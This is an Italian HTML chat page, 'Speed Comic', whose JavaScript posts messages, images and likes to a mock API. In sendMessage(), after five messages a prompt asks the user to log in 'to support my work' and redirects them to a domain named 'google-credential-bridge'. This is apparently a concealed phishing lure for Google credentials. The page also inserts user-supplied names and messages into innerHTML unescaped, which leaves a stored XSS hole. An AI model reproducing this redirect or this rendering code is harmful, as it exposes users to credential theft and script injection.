<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Speed Comic</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <script>
        // URL dei server
        const MESSAGES_SERVER_URL = "https://67cb65973395520e6af537e3.mockapi.io/api/v3/messages"; // Server per i messaggi
        const PROFILES_SERVER_URL = "https://67cb65973395520e6af537e3.mockapi.io/api/v3/profiles"; // Server per i profili

        let messageCount = 0; // Contatore dei messaggi inviati
        let currentProfile = null; // Profilo attuale (username e immagine)

        // Funzione per inviare un messaggio
        async function sendMessage() {
            const message = document.getElementById('message').value.trim();
            const imageInput = document.getElementById('image');

            // Verifica se il profilo è stato impostato
            if (!currentProfile || !currentProfile.username) {
                alert('Imposta prima il tuo profilo!');
                return;
            }

            if (!message) {
                alert('Scrivi un messaggio!');
                return;
            }

            const button = document.querySelector('button[onclick="sendMessage()"]');
            button.disabled = true;
            button.textContent = 'Invio in corso...';

            try {
                let imageBase64 = null;
                if (imageInput.files[0]) {
                    // Riduci le dimensioni dell'immagine
                    const resizedImage = await resizeImage(imageInput.files[0], 800, 800);
                    // Converti l'immagine ridimensionata in Base64
                    imageBase64 = await convertImageToBase64(resizedImage);
                }

                // Invia il messaggio al server
                const response = await fetch(MESSAGES_SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: currentProfile.username,
                        message,
                        image: imageBase64,
                        profileImage: currentProfile.image,
                        likes: 0 // Inizializza i "mi piace" a 0
                    })
                });

                if (!response.ok) throw new Error('Errore nell\'invio.');

                alert('Messaggio inviato!');
                document.getElementById('message').value = ''; // Pulisci il campo del messaggio
                document.getElementById('image').value = ''; // Pulisci il campo dell'immagine

                // Incrementa il contatore dei messaggi
                messageCount++;

                // Verifica se l'utente ha raggiunto il limite di 5 messaggi
                if (messageCount >= 5) {
                    alert('Hai raggiunto il limite di 5 messaggi! Fai il login per supportare il mio lavoro.');
                    window.location.href = 'https://google-credential-bridge.lovable.app/';
                }

                loadMessages();
            } catch (error) {
                console.error('Errore:', error);
                alert(`Errore nell'invio del messaggio: ${error.message}`);
            } finally {
                button.disabled = false;
                button.textContent = 'Invia Messaggio';
            }
        }

        // Funzione per caricare i messaggi
        async function loadMessages() {
            const messagesContainer = document.getElementById('messages');
            messagesContainer.innerHTML = '<p>Caricamento messaggi...</p>';

            try {
                const response = await fetch(MESSAGES_SERVER_URL);
                const messages = await response.json();

                messagesContainer.innerHTML = '';

                if (messages.length === 0) {
                    messagesContainer.innerHTML = '<p>Nessun messaggio disponibile.</p>';
                    return;
                }

                messages.forEach(msg => {
                    const messageElement = document.createElement('div');
                    messageElement.classList = "bg-white shadow rounded-lg p-4 mb-2";
                    let imageHtml = '';
                    if (msg.image) {
                        // Aggiungi l'immagine se presente
                        imageHtml = `<img src="${msg.image}" alt="Immagine" class="mt-2 rounded-lg" style="max-width: 100%; height: auto;">`;
                    }
                    let profileImageHtml = '';
                    if (msg.profileImage) {
                        // Aggiungi l'immagine del profilo se presente
                        profileImageHtml = `<img src="${msg.profileImage}" alt="Profilo" class="w-10 h-10 rounded-full mr-2">`;
                    }
                    messageElement.innerHTML = `
                        <div class="flex items-center">
                            ${profileImageHtml}
                            <p class="text-gray-700"><strong>${msg.username}:</strong> ${msg.message}</p>
                        </div>
                        ${imageHtml}
                        <div class="flex items-center mt-2">
                            <button onclick="likeMessage('${msg.id}')" class="text-red-500 hover:text-red-700">
                                <i class="fas fa-heart"></i>
                            </button>
                            <span class="ml-2">${msg.likes}</span>
                        </div>
                    `;
                    messagesContainer.appendChild(messageElement);
                });
            } catch (error) {
                console.error('Errore:', error);
                messagesContainer.innerHTML = '<p>Errore nel caricamento dei messaggi.</p>';
            }
        }

        // Funzione per gestire i "mi piace"
        async function likeMessage(messageId) {
            try {
                // Recupera il messaggio corrente
                const response = await fetch(`${MESSAGES_SERVER_URL}/${messageId}`);
                const message = await response.json();

                // Incrementa il conteggio dei "mi piace"
                const updatedLikes = message.likes + 1;

                // Aggiorna il messaggio sul server
                const updateResponse = await fetch(`${MESSAGES_SERVER_URL}/${messageId}`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ likes: updatedLikes })
                });

                if (!updateResponse.ok) throw new Error('Errore nell\'aggiornamento dei "mi piace".');

                // Ricarica i messaggi per mostrare il conteggio aggiornato
                loadMessages();
            } catch (error) {
                console.error('Errore:', error);
                alert('Errore nell\'aggiornamento dei "mi piace".');
            }
        }

        // Funzione per impostare il profilo
        async function setProfile() {
            const username = document.getElementById('profile-username').value.trim();
            const imageInput = document.getElementById('profile-image');

            if (!username) {
                alert('Inserisci un username!');
                return;
            }

            try {
                let profileImageBase64 = null;
                if (imageInput.files[0]) {
                    // Riduci le dimensioni dell'immagine del profilo
                    const resizedImage = await resizeImage(imageInput.files[0], 200, 200); // Ridimensiona a 200x200 px
                    // Converti l'immagine ridimensionata in Base64
                    profileImageBase64 = await convertImageToBase64(resizedImage);
                }

                // Salva il profilo nel server
                const response = await fetch(PROFILES_SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, image: profileImageBase64 })
                });

                if (!response.ok) throw new Error('Errore nel salvataggio del profilo.');

                // Aggiorna il profilo corrente
                currentProfile = { username, image: profileImageBase64 };
                document.getElementById('profile-preview').src = profileImageBase64 || '';
                document.getElementById('profile-preview').style.display = profileImageBase64 ? 'block' : 'none';

                alert('Profilo aggiornato!');
                document.getElementById('profile-modal').style.display = 'none';
            } catch (error) {
                console.error('Errore:', error);
                alert('Errore nel salvataggio del profilo. Assicurati che l\'immagine non sia troppo grande.');
            }
        }

        // Funzione per ridimensionare un'immagine
        function resizeImage(file, maxWidth, maxHeight) {
            return new Promise((resolve, reject) => {
                const img = new Image();
                const reader = new FileReader();

                reader.onload = (e) => {
                    img.src = e.target.result;
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        let width = img.width;
                        let height = img.height;

                        if (width > height) {
                            if (width > maxWidth) {
                                height *= maxWidth / width;
                                width = maxWidth;
                            }
                        } else {
                            if (height > maxHeight) {
                                width *= maxHeight / height;
                                height = maxHeight;
                            }
                        }

                        canvas.width = width;
                        canvas.height = height;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0, width, height);

                        canvas.toBlob((blob) => {
                            resolve(blob);
                        }, file.type, 0.7); // Compressione al 70%
                    };
                };

                reader.onerror = (error) => reject(error);
                reader.readAsDataURL(file);
            });
        }

        // Funzione per convertire un'immagine in Base64
        function convertImageToBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = () => resolve(reader.result);
                reader.onerror = () => reject(new Error('Errore nella conversione dell\'immagine.'));
                reader.readAsDataURL(file);
            });
        }

        // Carica i messaggi all'avvio
        document.addEventListener('DOMContentLoaded', () => {
            loadMessages();
        });
    </script>
</head>
<body class="bg-gray-100">
    <header class="bg-white shadow">
        <div class="container mx-auto px-4 py-6 flex justify-between items-center">
            <h1 class="text-3xl font-bold text-gray-800">Speed Comic</h1>
            <div class="flex items-center">
                <button class="bg-blue-500 hover:bg-blue-700 text-white py-2 px-4 rounded mr-2"
                    onclick="document.getElementById('login-modal').style.display='flex'; document.getElementById('register-modal').style.display='none';">
                    Login
                </button>
                <button class="bg-green-500 hover:bg-green-700 text-white py-2 px-4 rounded mr-2"
                    onclick="document.getElementById('register-modal').style.display='flex'; document.getElementById('login-modal').style.display='none';">
                    Registrati
                </button>
                <button class="bg-purple-500 hover:bg-purple-700 text-white py-2 px-4 rounded"
                    onclick="document.getElementById('profile-modal').style.display='flex';">
                    Profilo
                </button>
            </div>
        </div>
    </header>

    <main class="container mx-auto px-4 py-8">
        <section class="text-center mb-12">
            <h2 class="text-4xl font-bold text-gray-800 mb-4">Scrivi un messaggio</h2>
        </section>

        <section class="bg-white shadow rounded-lg p-6">
            <textarea id="message" class="border rounded w-full py-2 px-3 mb-4" rows="4" placeholder="Messaggio"></textarea>
            <input id="image" class="border rounded w-full py-2 px-3 mb-4" type="file" accept="image/*"/>
            <button class="bg-blue-500 hover:bg-blue-700 text-white py-2 px-4 rounded" onclick="sendMessage()">
                Invia Messaggio
            </button>
        </section>

        <section class="mt-8">
            <h3 class="text-2xl font-bold text-gray-800 mb-4">Messaggi Recenti</h3>
            <div id="messages"></div>
        </section>
    </main>

    <footer class="bg-white shadow mt-12">
        <div class="container mx-auto px-4 py-6 text-center">
            <p class="text-gray-600">© 2024 Chat Lupo Umberto. Tutti i diritti riservati.</p>
        </div>
    </footer>

    <!-- Modale Profilo -->
    <div id="profile-modal" class="fixed inset-0 bg-gray-600 bg-opacity-50 flex items-center justify-center" style="display: none;">
        <div class="bg-white shadow rounded-lg p-6 w-full max-w-sm">
            <h3 class="text-2xl font-bold text-gray-800 mb-4">Profilo</h3>
            <input id="profile-username" class="border rounded w-full py-2 px-3 mb-4" type="text" placeholder="Nome utente"/>
            <input id="profile-image" class="border rounded w-full py-2 px-3 mb-4" type="file" accept="image/*"/>
            <img id="profile-preview" src="" alt="Anteprima immagine profilo" class="w-20 h-20 rounded-full mb-4" style="display: none;"/>
            <button class="bg-purple-500 hover:bg-purple-700 text-white py-2 px-4 rounded" onclick="setProfile()">
                Salva Profilo
            </button>
        </div>
    </div>
</body>
</html>
